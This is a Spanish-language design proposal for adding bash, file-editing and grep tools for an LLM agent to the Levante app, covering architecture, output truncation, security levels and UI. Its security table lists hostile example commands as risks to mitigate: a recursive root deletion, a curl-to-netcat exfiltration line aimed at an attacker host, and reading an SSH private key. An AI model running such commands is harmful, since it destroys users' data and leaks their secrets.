# Integración de Coding Agent en Levante

Este documento describe cómo se podría integrar un sistema de ejecución de código similar al de `coding-agent` (pi-mono) en Levante.

---

## 1. ¿Es Posible?

**Sí, es factible.** Levante ya cuenta con aproximadamente el 70% de la infraestructura necesaria:

| Componente | Estado | Descripción |
|------------|--------|-------------|
| AI SDK + streaming | ✅ Existe | `AIService` con Vercel AI SDK |
| Sistema de tools | ✅ Existe | `mcpToolsAdapter` convierte tools a formato AI SDK |
| IPC estructurado | ✅ Existe | Namespace `levante/*` con handlers |
| Resolución de comandos | ✅ Existe | `commandResolver.ts` para ejecutar procesos |
| Persistencia de mensajes | ✅ Existe | SQLite con `ChatService` |
| **Ejecución directa de bash** | ❌ Falta | Herramienta bash integrada |
| **Tools de edición de archivos** | ❌ Falta | Read, Write, Edit, Grep |

---

## 2. Arquitectura Propuesta

### 2.1 Ubicación en el Proyecto

```
src/main/services/coding-agent/
├── tools/
│   ├── bash.ts          # Ejecutar comandos bash
│   ├── read.ts          # Leer archivos
│   ├── write.ts         # Escribir archivos
│   ├── edit.ts          # Editar archivos (reemplazar texto)
│   └── grep.ts          # Buscar en contenido de archivos
├── bash-executor.ts     # Motor de ejecución de bash
├── shell-utils.ts       # Utilidades cross-platform
├── truncate.ts          # Límites de output
└── index.ts             # Exporta todas las tools
```

### 2.2 Integración con AIService

Las nuevas herramientas se agregarían junto a las herramientas MCP existentes:

```
┌─────────────────────────────────────────────────────────────┐
│                      AIService.streamChat()                 │
│                              │                              │
│              ┌───────────────┼───────────────┐              │
│              │               │               │              │
│              ▼               ▼               ▼              │
│      ┌─────────────┐  ┌─────────────┐  ┌─────────────┐      │
│      │  MCP Tools  │  │Coding Tools │  │ Built-in    │      │
│      │  (servers)  │  │   (NUEVO)   │  │   Tools     │      │
│      └─────────────┘  └─────────────┘  └─────────────┘      │
│              │               │               │              │
│              └───────────────┼───────────────┘              │
│                              ▼                              │
│                    streamText({ tools })                    │
│                              │                              │
│                              ▼                              │
│                       LLM selecciona                        │
│                       herramienta                           │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. Flujo de Ejecución de Comandos

### 3.1 Flujo General

```
1. Usuario: "Lista los archivos del proyecto"
           │
           ▼
2. AIService recibe mensaje
           │
           ▼
3. LLM decide usar herramienta bash
   Genera: { tool: "bash", command: "ls -la" }
           │
           ▼
4. AIService detecta tool-call
           │
           ▼
5. bashTool.execute("ls -la")
           │
           ▼
6. BashExecutor spawns proceso
   ┌────────────────────────────────┐
   │  spawn(bash, ["-c", "ls -la"]) │
   └────────────────────────────────┘
           │
           ▼
7. Output se streama en chunks
   "total 128\ndrwxr-xr-x  12 user..."
           │
           ▼
8. Se trunca si excede límites (2000 líneas / 50KB)
           │
           ▼
9. Resultado vuelve al LLM como tool-result
           │
           ▼
10. LLM genera respuesta final al usuario
```

### 3.2 Ejecución Cross-Platform

El sistema detecta el shell disponible según la plataforma:

```
┌─────────────┬────────────────────────────────────────────┐
│  Plataforma │  Shell Utilizado                           │
├─────────────┼────────────────────────────────────────────┤
│  macOS      │  /bin/bash (nativo)                        │
├─────────────┼────────────────────────────────────────────┤
│  Linux      │  /bin/bash (nativo)                        │
├─────────────┼────────────────────────────────────────────┤
│  Windows    │  Git Bash, WSL, Cygwin o MSYS2             │
└─────────────┴────────────────────────────────────────────┘
```

En Windows, se busca bash en este orden:
1. `C:\Program Files\Git\bin\bash.exe` (Git Bash)
2. `C:\Program Files (x86)\Git\bin\bash.exe`
3. `bash.exe` en PATH (WSL, Cygwin, MSYS2)

Esto permite usar los **mismos comandos Unix** en todas las plataformas.

---

## 4. Herramientas Propuestas

### 4.1 Bash Tool

Ejecuta comandos en el shell del sistema.

```typescript
// Esquema de parámetros
{
  command: string,    // Comando a ejecutar
  timeout?: number    // Timeout opcional en segundos
}

// Ejemplo de uso por el LLM
{ tool: "bash", command: "npm test" }
{ tool: "bash", command: "git status" }
{ tool: "bash", command: "find . -name '*.ts' | head -20" }
```

### 4.2 Read Tool

Lee contenido de archivos.

```typescript
// Esquema
{
  path: string,       // Ruta del archivo
  offset?: number,    // Línea inicial (opcional)
  limit?: number      // Número de líneas (opcional)
}

// Ejemplo
{ tool: "read", path: "src/main/index.ts" }
{ tool: "read", path: "package.json", limit: 50 }
```

### 4.3 Write Tool

Escribe contenido completo a un archivo.

```typescript
// Esquema
{
  path: string,       // Ruta del archivo
  content: string     // Contenido a escribir
}

// Ejemplo
{ tool: "write", path: "src/utils/helper.ts", content: "export function..." }
```

### 4.4 Edit Tool

Reemplaza texto específico en un archivo (más preciso que reescribir todo).

```typescript
// Esquema
{
  path: string,       // Ruta del archivo
  oldText: string,    // Texto a buscar
  newText: string     // Texto de reemplazo
}

// Ejemplo
{
  tool: "edit",
  path: "src/config.ts",
  oldText: "const DEBUG = false",
  newText: "const DEBUG = true"
}
```

### 4.5 Grep Tool

Busca patrones en archivos.

```typescript
// Esquema
{
  pattern: string,    // Patrón regex a buscar
  path?: string,      // Directorio o archivo
  include?: string    // Filtro de archivos (ej: "*.ts")
}

// Ejemplo
{ tool: "grep", pattern: "TODO:", include: "*.ts" }
```

---

## 5. Manejo de Output

### 5.1 Límites de Truncado

Para evitar que outputs enormes consuman toda la memoria o tokens del LLM:

| Límite | Valor | Descripción |
|--------|-------|-------------|
| Máximo líneas | 2,000 | Se trunca desde el inicio, conservando el final |
| Máximo bytes | 50 KB | Límite absoluto de tamaño |
| Línea máxima | 500 chars | Líneas muy largas se cortan |

### 5.2 Archivos Temporales

Si el output excede los límites, se guarda completo en un archivo temporal:

```
/tmp/levante-bash-abc123.log  ← Output completo
```

El LLM recibe el output truncado + referencia al archivo completo.

---

## 6. Seguridad

### 6.1 Consideraciones

La ejecución de código arbitrario conlleva riesgos:

| Riesgo | Descripción | Mitigación |
|--------|-------------|------------|
| Comandos destructivos | `rm -rf /` | Confirmación de usuario |
| Exfiltración de datos | `curl ... \| nc attacker.com` | Bloquear comandos de red |
| Acceso a secretos | `cat ~/.ssh/id_rsa` | Restricción de directorios |
| Procesos infinitos | `yes` o loops | Timeout obligatorio |

### 6.2 Opciones de Implementación

**Nivel 1: Sin restricciones (desarrollo local)**
- El usuario confía completamente en el LLM
- Útil para uso personal en proyectos propios

**Nivel 2: Confirmación de usuario**
- Antes de ejecutar, mostrar el comando al usuario
- Usuario aprueba o rechaza

**Nivel 3: Sandbox**
- Ejecución en entorno aislado (Docker, E2B)
- Mayor seguridad pero más complejo

### 6.3 Variables de Entorno

Se debe sanitizar el entorno para no exponer secretos:

```typescript
// Heredar env del proceso pero limpiar claves sensibles
{
  ...process.env,
  OPENAI_API_KEY: undefined,
  ANTHROPIC_API_KEY: undefined,
  // etc.
}
```

---

## 7. Integración con UI

### 7.1 Visualización en Chat

Los resultados de herramientas se mostrarían en el chat:

```
┌─────────────────────────────────────────────────────────────┐
│ 🤖 Assistant                                                │
│                                                             │
│ Voy a listar los archivos del proyecto.                     │
│                                                             │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ $ ls -la                                                │ │
│ │ ──────────────────────────────────────────────────────  │ │
│ │ total 128                                               │ │
│ │ drwxr-xr-x  12 user  staff   384 Feb 18 10:30 .         │ │
│ │ drwxr-xr-x   5 user  staff   160 Feb 18 09:15 ..        │ │
│ │ -rw-r--r--   1 user  staff  1234 Feb 18 10:30 package.  │ │
│ │ ...                                                     │ │
│ └─────────────────────────────────────────────────────────┘ │
│                                                             │
│ El proyecto tiene 12 archivos y carpetas en la raíz.        │
└─────────────────────────────────────────────────────────────┘
```

### 7.2 Indicador de Ejecución

Mientras un comando se ejecuta:

```
┌─────────────────────────────────────────────────────────────┐
│ ⟳ Ejecutando: npm test                                      │
│ ████████████░░░░░░░░░░░░░░░░░░░░  35%                       │
│                                                             │
│ Running test suites...                                      │
│ PASS src/utils/helper.test.ts                               │
│ PASS src/services/chat.test.ts                              │
│ ...                                                         │
└─────────────────────────────────────────────────────────────┘
```

---

## 8. Diferencias con MCP Actual

| Aspecto | MCP (actual) | Coding Agent (propuesto) |
|---------|--------------|--------------------------|
| Ejecución | Servidor MCP externo | Directamente en Levante |
| Configuración | Requiere configurar servers | Built-in, sin configuración |
| Latencia | Mayor (IPC con servidor) | Menor (ejecución directa) |
| Aislamiento | Servidor separado | Mismo proceso (o sandbox) |
| Flexibilidad | Cualquier tool del servidor | Tools predefinidas |

### ¿Cuándo usar cada uno?

- **MCP**: Integraciones específicas (bases de datos, APIs, servicios)
- **Coding Agent**: Tareas de desarrollo local (bash, editar archivos, buscar código)

Ambos pueden coexistir. El LLM elegiría la herramienta más apropiada.

---

## 9. Estimación de Esfuerzo

| Componente | Complejidad | Archivos Nuevos |
|------------|-------------|-----------------|
| Shell utilities | Media | 1 |
| Bash executor | Media | 1 |
| Bash tool | Baja | 1 |
| Read tool | Baja | 1 |
| Write tool | Baja | 1 |
| Edit tool | Media-Alta | 1 |
| Grep tool | Baja | 1 |
| Truncation | Baja | 1 |
| Integración AIService | Baja | Modificar existente |
| UI para resultados | Media | Modificar existente |
| **Total** | **Media** | **~8-10 archivos** |

Estimación: **~1,200-1,500 líneas de código nuevo**

---

## 10. Próximos Pasos

1. **Definir nivel de seguridad** deseado (sin restricciones / confirmación / sandbox)
2. **Implementar shell-utils.ts** con detección cross-platform
3. **Implementar bash-executor.ts** con streaming y truncado
4. **Crear las tools** (bash, read, write, edit, grep)
5. **Integrar en AIService** junto a MCP tools
6. **Actualizar UI** para mostrar resultados de ejecución
7. **Testing** en macOS, Linux y Windows

---

## 11. Referencias

- [Arquitectura original de coding-agent](./coding-agent-reference.md) (si se incluye)
- [MCP Tools Adapter](../../src/main/services/mcp/mcpToolsAdapter.ts)
- [AI Service](../../src/main/services/ai/aiService.ts)
- [Command Resolver](../../src/main/services/mcp/commandResolver.ts)
